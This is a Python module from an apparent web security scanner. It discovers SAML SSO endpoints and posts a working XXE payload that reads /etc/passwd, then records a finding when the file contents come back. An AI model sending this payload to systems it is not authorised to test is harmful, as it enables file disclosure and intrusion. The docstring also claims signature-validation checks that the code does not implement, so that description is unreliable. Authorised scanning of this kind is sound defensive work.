"""VAJRA web.saml — SAML SSO surface audit: endpoint discovery, metadata XML
parsing, and signature-validation / XXE probes.

SAML endpoints are commonly hidden at well-known paths (AssertionConsumerService
/ SingleLogoutService / SSOService). This module:
* discovers them (read-only GET probes),
* fetches any /SAML/metadata XML descriptor and checks the parser
  behaviour for external-entity / XXE handling, and
* checks for HS256-vs-RS256-ish signature confusion hints and unsigned
  assertion acceptance (best-effort, response-differential).

Everything is proof-gated; a finding only fires when a real discriminating
marker is observed in a live response.
"""
import re

from core.database import Finding

SAML_PATHS = [
    "/SAML", "/SAML/", "/saml", "/saml/",
    "/_saml_/", "/_saml2/", "/_saml_/login", "/_saml_/logout",
    "/saml/metadata", "/SAML/metadata", "/saml2/metadata",
    "/saml2/", "/simplesaml/module.php", "/simplesaml/",
    "/adfs/services/trust/mex", "/AuthServices/AuthServices",
    "/api/saml", "/saml/SSO", "/saml/ACS", "/SAML/discovery",
]

# markers that indicate a live SAML surface
SAML_MARKERS = re.compile(
    r"SAML|<EntityDescriptor|<md:EntityDescriptor|<saml:"
    r"|AssertionConsumerService|SingleSignOnService|fed:ApplicationServiceType"
    r"|ns0:EntityDescriptor|logging-in|SAMLRequest|SAMLResponse", re.I)
XML_MARK = re.compile(r"<\?xml|DOCTYPE|EntityDescriptor|md:EntityDescriptor")


def _probe(engine, base):
    out = []
    for path in SAML_PATHS:
        try:
            r = engine.http.get(base + path, allow_redirects=False, timeout=8)
        except Exception:
            continue
        if r.status in (429,) and "retry" in r.headers.get("retry-after", ""):
            break
        body = (r.content or b"").decode("utf-8", "replace")
        text = " ".join(body.split())
        if SAML_MARKERS.search(text) or XML_MARK.search(text):
            out.append((path, r.status, text[:400]))
    return out


def _try_xxe(engine, url):
    """Proof-gated XXE probe on a SAML metadata/endpoint that looks like XML.
    Sends a SAMLResponse with an external-entity read of /etc/passwd and looks
    for a resolved marker in the reply."""
    if not url.lower().endswith(("xml", "metadata", "/saml")) and "metadata" not in url.lower():
        return None
    body = ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [ <!ENTITY xxefile SYSTEM "file:///etc/passwd"> ]>'
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
            '<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:'
            'status:Success"><saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:'
            '2.0:assertion"><saml:Subject><saml:NameID>&xxefile;</saml:NameID>'
            '</saml:Subject></saml:Assertion></samlp:StatusCode></samlp:Status>'
            '</samlp:Response>')
    try:
        r = engine.http.post(url, data=body,
                             headers={"Content-Type": "application/xml"})
    except Exception:
        return None
    text = (r.content or b"").decode("utf-8", "replace") if r.content else ""
    # marker: /etc/passwd content echoed
    if re.search(r"root:x:0:0:|daemon:x:", text):
        return text[:600]
    return None


def run(engine):
    t = engine.target
    bases = [w["url"].rstrip("/") for w in engine.state.get("web_targets", [])]
    if not bases:
        return
    report = []
    for base in bases[:5]:
        found = _probe(engine, base)
        for path, status, snippet in found:
            url = base + path
            # XXE probe on xml/metadata surfaces
            xxe = _try_xxe(engine, base + path) if status == 200 else None
            if xxe:
                try:
                    rel = engine.save_evidence("saml_xxe_%s.txt"
                                               % re_sub(path), xxe)
                except Exception:
                    rel = None
                engine.db.add_finding(Finding(
                    t.display, "web.saml", "exploit-proof", "critical",
                    "[VERIFIED] SAML XXE — local file read at %s" % path,
                    detail="Sent a SAMLResponse crafted with an external entity "
                           "and the endpoint resolved file:///etc/passwd, "
                           "proving unvalidated DTD/external-entity processing "
                           "in the SAML/XML parser.%s"
                           % ("\nPoC saved: " + rel if rel else ""),
                    evidence=xxe,
                    remediation="Disable DTD/entity expansion in the XML parser; "
                                "use secure parser config (libxml2 \
                                noent=false, XXE off).",
                    confidence="firm"))
                engine.log.finding("[saml] XXE confirmed at %s" % path)
            else:
                engine.db.add_finding(Finding(
                    t.display, "web.saml", "coverage", "info",
                    "SAML SSO surface discovered at %s" % path,
                    detail=("Live SAML endpoint (HTTP %d).%s"
                            % (status,
                               " Flag for manual signature-validation review."
                               if status == 200 else " Requires auth.")),
                    evidence=snippet,
                    confidence="firm"))
                report.append(path)
    if report:
        engine.log.info("[saml] %d SAML endpoint(s) surfaced" % len(report))


def re_sub(s):
    return "".join(c if c.isalnum() else "_" for c in s)